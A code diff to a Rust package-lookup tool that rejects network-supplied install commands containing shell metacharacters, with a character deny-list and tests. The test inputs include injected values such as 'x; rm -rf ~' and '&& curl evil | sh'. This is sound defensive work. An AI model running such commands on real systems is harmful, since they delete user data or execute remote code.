@@ -109,9 +109,32 @@ pub fn find_package(
             repo_label: repo.label.clone(),
             name: package.install_name().to_owned(),
             version: package.version.clone(),
-            install_command: repo.install.replace("{package}", package.install_name()),
+            install_command: install_command(&repo.install, package.install_name())?,
         })
     })
+}
+
+/// The command people copy into a terminal, often with sudo. Both parts
+/// come from the network, so anything that could chain or redirect another
+/// command is refused instead of shown.
+fn install_command(template: &str, package: &str) -> Option<String> {
+    let safe_package = !package.is_empty() && package.chars().all(is_package_character);
+    let fixed_part = template.replace("{package}", "");
+    let safe_template = template.contains("{package}") && !fixed_part.chars().any(is_shell_character);
+    if !safe_package || !safe_template {
+        tracing::warn!("Refused an install command for {package:?} from {template:?}");
+        return None;
+    }
+    Some(template.replace("{package}", package))
+}
+
+fn is_package_character(character: char) -> bool {
+    character.is_ascii_alphanumeric() || "@._+:-".contains(character)
+}
+
+/// Characters that chain, substitute or redirect commands in a shell.
+fn is_shell_character(character: char) -> bool {
+    ";|&$`<>\\(){}\n\r".contains(character)
 }
 
 /// "alpine_3_22_1" (from VERSION_ID 3.22.1) matches Repology's "alpine_3_22".
@@ -201,6 +224,14 @@ mod tests {
 
         let found = find_package(&packages, &repos, "hyprland").unwrap();
         assert_eq!(found.install_command, "sudo pacman -S hyprland");
+    }
+
+    #[test]
+    fn refuses_install_commands_that_could_run_something_else() {
+        assert_eq!(install_command("sudo dnf install {package}", "gnome-shell").as_deref(), Some("sudo dnf install gnome-shell"));
+        assert_eq!(install_command("sudo dnf install {package}", "x; rm -rf ~"), None);
+        assert_eq!(install_command("sudo dnf install {package} && curl evil | sh", "niri"), None);
+        assert_eq!(install_command("sudo apt install $({package})", "niri"), None);
     }
 
     #[test]
